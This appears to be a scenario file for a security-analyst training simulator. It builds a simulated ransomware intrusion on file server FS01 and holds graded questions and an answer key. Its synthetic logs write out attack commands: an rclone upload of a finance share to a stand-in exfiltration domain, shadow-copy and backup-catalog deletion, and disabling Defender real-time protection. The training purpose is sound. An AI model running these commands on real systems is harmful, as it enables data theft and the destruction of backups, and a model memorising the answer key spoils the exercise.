// E2 · Shadow copies deleted on a file server: a ransomware operator on FS01
// through a stolen admin account, after uploading ~1 GB with rclone. A test
// encryption has started. Contain first.

import { E } from '../../engine/format.js';
import { account, hostNamed, dom, BINARIES as B } from '../../engine/env.js';
import { defineScenario, ran, single, host, account as acct, link } from '../lib.js';

const FS = hostNamed('FS01');
const ADMIN = account('adm.emorales');
const WS0 = hostNamed('WS-SAL-007');
const EXFIL = 'cloudsync-drop.example';
const EXFIL_IP = '198.51.100.171';
const CHG = 'CHG-4531';

export default defineScenario({
  code: 'E2', level: 'expert',
  title: 'Volume shadow copies deleted on FS01', rule: 'EDR-0820', severity: 'critical', queue: 'endpoint',
  blurb: 'An endpoint rule reports shadow copies deleted on a file server.',
  sources: ['edr', 'winsec', 'fileaudit', 'proxy', 'dns', 'firewall'], sourceGroups: ['endpoint', 'windows', 'proxy'],
  skills: ['kno.malware', 'res.containment', 'inv.timeline', 'inv.scope'],
  entities: { domains: [EXFIL], ips: [EXFIL_IP], ids: [CHG] },
  history: 45 * 60,
  alertTags: ['vss_delete'],
  build(x) {
    x.add('decoy_rdp', E.winsec(x.T(-40 * 60), FS.name, 4624, 'An account was successfully logged on', { target_user: dom('adm.rkhan'), logon_type: 10, auth_package: 'Kerberos', src_ip: hostNamed('JUMP01').ip, workstation: 'JUMP01' }));
    x.add('decoy_backup', E.fileaudit(x.T(-35 * 60), { user: dom('svc_backup'), share: '\\\\FS01\\Finance', path: 'D:\\Shares\\Finance', access: 'ReadData', process: 'C:\\Program Files\\VaultLine\\Agent\\vlagent.exe', src_ip: hostNamed('BKP01').ip }));
    x.add('rdp_in', E.winsec(x.T(-25 * 60), FS.name, 4624, 'An account was successfully logged on', { target_user: dom(ADMIN.sam), logon_type: 10, auth_package: 'NTLM', src_ip: WS0.ip, workstation: WS0.name, logon_id: '0x7FA112' }));
    x.add('tools', E.edr(x.T(-20 * 60), FS.name, 11, 'FileCreate', { user: dom(ADMIN.sam), image: 'C:\\Windows\\explorer.exe', target_filename: 'C:\\PerfLogs\\rc.exe' }));
    x.add('tools', E.edr(x.T(-20 * 60 + 5), FS.name, 11, 'FileCreate', { user: dom(ADMIN.sam), image: 'C:\\Windows\\explorer.exe', target_filename: 'C:\\PerfLogs\\run.bat' }));
    x.add('tools', E.procCreate(x.T(-19 * 60), FS.name, { user: dom(ADMIN.sam), image: B.cmd.path, command_line: 'cmd.exe /c C:\\PerfLogs\\run.bat', pid: 6200, parent_image: B.explorer.path, ppid: 2240 }));
    x.add('tools', E.procCreate(x.T(-19 * 60 + 3), FS.name, { user: dom(ADMIN.sam), image: 'C:\\PerfLogs\\rc.exe', command_line: `rc.exe copy D:\\Shares\\Finance remote:${EXFIL}/fin --transfers 8`, pid: 6212, parent_image: B.cmd.path, ppid: 6200 }));
    const n = x.n(6, 5);
    for (let i = 0; i < n; i++) x.add('exfil', E.proxy(x.T(-18 * 60 + i * 120), { src_ip: FS.ip, user: '-', method: 'POST', url: `https://${EXFIL}/upload`, dest_ip: EXFIL_IP, status: 200, bytes_out: x.n(180, 150) * 1048576, bytes_in: 2200, category: 'Uncategorized', ua: 'rclone/v1.66.0' }));
    x.add('defender_off', E.edr(x.T(-70), FS.name, 13, 'RegistryValueSet', { user: dom(ADMIN.sam), image: B.powershell.path, target_object: 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring', details: 'DWORD (0x00000001)' }));
    x.add('vss_delete', E.procCreate(x.T(-12), FS.name, { user: dom(ADMIN.sam), image: 'C:\\Windows\\System32\\vssadmin.exe', command_line: 'vssadmin.exe delete shadows /all /quiet', pid: 6420, parent_image: B.cmd.path, ppid: 6200 }));
    x.add('vss_delete', E.procCreate(x.T(-10), FS.name, { user: dom(ADMIN.sam), image: 'C:\\Windows\\System32\\wbadmin.exe', command_line: 'wbadmin delete catalog -quiet', pid: 6431, parent_image: B.cmd.path, ppid: 6200 }));
    x.add('tools', E.procCreate(x.T(-5), FS.name, { user: dom(ADMIN.sam), image: 'C:\\PerfLogs\\svc.exe', command_line: 'C:\\PerfLogs\\svc.exe --test 20 D:\\Shares\\Finance', pid: 6440, parent_image: B.cmd.path, ppid: 6200 }));
    for (let i = 0; i < 20; i++) x.add('encrypt_test', E.fileaudit(x.T(40 + i), { user: dom(ADMIN.sam), share: '\\\\FS01\\Finance', path: `D:\\Shares\\Finance\\Payroll\\2026_${String(i + 1).padStart(2, '0')}.xlsx.lck`, ext: 'lck', access: 'WriteData', process: 'C:\\PerfLogs\\svc.exe', src_ip: FS.ip }));
  },
  alert: () => ({
    description: `vssadmin deleted all shadow copies on ${FS.name}, followed by wbadmin deleting the backup catalog.`,
    entity: { host: FS.name, ip: FS.ip, user: ADMIN.sam },
    details: [['Host', FS.name], ['User', ADMIN.sam], ['Commands', 'vssadmin delete shadows /all /quiet; wbadmin delete catalog -quiet'], ['Rule logic', 'Shadow-copy or backup-catalog deletion on a server']],
    guidance: ['Decide what has to happen first.', 'Find how the operator got in and what they did before.'],
  }),
  accountNotes: { 'adm.emorales': ['Usual hosts: WS-IT-005 and JUMP01. Never from a Sales workstation.'] },
  changes: [{ id: CHG, title: 'FS01 patching window (remote desktop from JUMP01)', scope: 'FS01 via JUMP01 as adm.rkhan', owner: 'IT Infrastructure', status: 'Completed', start: -45, end: -38, detail: 'Monthly patching.' }],
  triage: {
    checks: [{ id: 'dir', label: 'Account looked up in the directory', test: ran('user', ADMIN.sam) }],
    verdict: { accept: 'tp', explain: 'Shadow-copy deletion by an admin session at an odd time is a ransomware precursor.' },
    severity: { accept: 'critical', explain: 'Encryption is imminent on the main file server.' },
    evidence: { tags: ['vss_delete'], explain: 'The deletion commands.' },
  },
  l2: {
    intro: 'Encryption may already have started. Decide what has to happen first, then reconstruct how the operator got here.',
    fields: [
      single('first_action', 'What has to happen first', 10, [['isolate', `Isolate ${FS.name} now, then investigate`], ['investigate', 'Investigate fully before acting'], ['restore', 'Restore from shadow copies'], ['notify', 'Notify the business and wait']], 'isolate', { explain: 'Containment comes before root cause when encryption has begun.', skills: ['res.containment'] }),
      link(host('entry', 'Workstation the operator came from', 6, WS0.name, { hint: 'Find the remote desktop logon to FS01 before the tools appeared.', explain: 'RDP from a Sales workstation with an IT admin account.', skills: ['inv.pivot'] }), 'rdp_in'),
      acct('account', 'Account used', 4, ADMIN.sam, { explain: 'The server administration account.', skills: ['log.windows-auth'] }),
      link(single('exfil', 'Was data taken', 8, [['yes', `Yes, about 1 GB to ${EXFIL}`], ['no', 'No'], ['unknown', 'Cannot tell']], 'yes', { hint: 'Search the proxy for uploads from FS01.', explain: 'rclone uploads before the encryption: double extortion, which changes the notification duty.', skills: ['inv.scope', 'log.network'] }), 'exfil'),
      link(single('encryption', 'Has encryption started', 6, [['test', 'Yes, a test batch of 20 files'], ['all', 'Yes, the whole share'], ['no', 'No']], 'test', { hint: 'Search file audit for new extensions.', explain: 'Twenty payroll files renamed to .lck.', skills: ['kno.malware'] }), 'encrypt_test'),
    ],
  },
  response: {
    scope: { hosts: [FS.name, WS0.name], accounts: [ADMIN.sam], domains: [EXFIL], ips: [EXFIL_IP] },
    contained: (st) => st.offline(FS.name),
    objectives: [
      { id: 'contain_fs', label: `Isolate ${FS.name} within 8 minutes of taking the incident`, points: 5, containment: true, skills: ['res.containment'], eval: (st, ctx) => { const t = st.everIsolated.get(FS.name); const s = ctx.case.stages.l3_response?.startedAt; return t && s && t - s <= 8 * 60000 ? 1 : t ? 0.4 : 0; }, explain: 'Every minute FS01 stays online, more files are encrypted.' },
      { id: 'contain_ws', label: `Isolate ${WS0.name}`, points: 3, containment: true, eval: (st) => (st.offline(WS0.name) ? 1 : 0), explain: 'The operator\'s foothold.' },
      { id: 'creds', label: 'Disable the stolen admin account', points: 3, containment: true, eval: (st) => (st.disabled.has(ADMIN.sam) ? 1 : st.reset.has(ADMIN.sam) ? 0.6 : 0), explain: 'Disabling stops it immediately; a reset alone leaves an active session.' },
      { id: 'block', label: 'Block the exfiltration domain', points: 3, containment: true, eval: (st) => (st.domainBlocked(EXFIL) || st.ipBlocked(EXFIL_IP) ? 1 : 0), explain: 'Stops any further upload.' },
      { id: 'evidence', label: `Collect a forensic package from ${FS.name}`, points: 2, skills: ['doc.evidence'], eval: (st) => (st.evidence.has(FS.name) ? 1 : 0), explain: 'The tools in C:\\PerfLogs and memory are the evidence.' },
    ],
  },
  closure: {
    disposition: { options: [['incident', 'True positive: ransomware with data theft'], ['contained', 'True positive, no impact'], ['fp', 'False positive'], ['admin', 'Administrator maintenance']], accept: 'incident', explain: 'Data taken and encryption started.' },
    rootCause: { options: [['stolen_admin', 'Stolen admin credentials used from a compromised workstation'], ['vuln', 'An unpatched file server vulnerability'], ['insider', 'A disgruntled administrator'], ['phish_fs', 'A phishing email opened on the server']], accept: 'stolen_admin', explain: 'The admin account was used from a Sales workstation.' },
    actions: { options: [['notify', 'Notify management and legal of data theft'], ['restore', 'Restore from offline backup'], ['reset_admins', 'Reset all admin passwords'], ['pay', 'Pay the ransom'], ['shadow', 'Restore from shadow copies']], set: ['notify', 'restore', 'reset_admins'], explain: 'Shadow copies were deleted; paying funds the attacker.', skills: ['res.recovery'] },
  },
  truth: { summary: `A ransomware operator, on the network through ${WS0.name}, logged on to ${FS.name} by remote desktop with the stolen account ${ADMIN.sam}, uploaded about 1 GB of the Finance share with a renamed rclone to ${EXFIL}, disabled real-time protection and deleted the shadow copies and backup catalog. A test encryption of 20 files followed. The earlier remote desktop by adm.rkhan was approved patching and the backup read is the nightly job.`, timeline: [[-25 * 60, 'RDP to FS01 from a Sales workstation.'], [-20 * 60, 'Tools dropped in C:\\PerfLogs.'], [-18 * 60, 'Upload to the exfiltration domain begins.'], [-70, 'Real-time protection disabled.'], [-12, 'Shadow copies deleted.'], [40, 'Test encryption of 20 files.']], iocs: [{ type: 'domain', value: EXFIL, note: 'Exfiltration destination' }] },
  test: { tools: { l1_triage: [['user', ADMIN.sam]] }, response: [['isolate_host', FS.name], ['isolate_host', WS0.name], ['disable_account', ADMIN.sam], ['block_domain', EXFIL], ['acquire_evidence', FS.name]] },
});
